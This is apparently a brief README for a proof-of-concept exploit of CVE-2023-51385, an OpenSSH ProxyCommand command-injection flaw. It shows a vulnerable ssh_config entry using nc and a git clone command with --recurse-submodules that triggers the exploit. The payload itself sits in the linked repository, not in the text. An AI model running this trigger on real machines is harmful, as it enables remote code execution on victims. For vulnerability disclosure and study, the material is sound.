# CVE-2023-51385
OpenSSH ProxyCommand RCE

1. When your ProxyCommand is configured as follows:
```
Host *.com
  ProxyCommand /usr/bin/nc -X connect -x 127.0.0.1:7890 %h %p
```
2. Use the following command for proof of concept
```
git clone https://github.com/Le1a/CVE-2023-51385 --recurse-submodules
```

